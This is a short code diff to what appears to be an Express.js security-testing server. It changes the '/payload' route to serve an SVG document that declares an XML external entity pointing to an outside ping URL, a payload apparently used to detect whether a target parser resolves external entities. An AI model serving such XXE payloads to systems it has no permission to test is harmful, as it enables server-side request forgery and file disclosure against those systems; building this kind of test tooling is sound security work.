@@ -9,8 +9,9 @@ router.get('/', function(req, res) {
 });
 
 router.get('/payload', function(req, res) {
-   res.status(201).send('<!--?xml version="1.0" ?--><!DOCTYPE replace [<!ENTITY example "Doe"> ]><userInfo><firstName>John</firstName><lastName>&example;</lastName></userInfo>')
-});
+  var pay = '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!-- an internal subset can be embedded here --><!ENTITY xxe SYSTEM "https://toiletbrush.cleverapps.io/ping">]><svg width="100%" height="100%" viewBox="0 0 100 100"     xmlns="http://www.w3.org/2000/svg">  <text x="20" y="35">My &xxe;</text></svg>'
+   res.status(201).send(pay)
+ });
 
  router.get('/redir', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
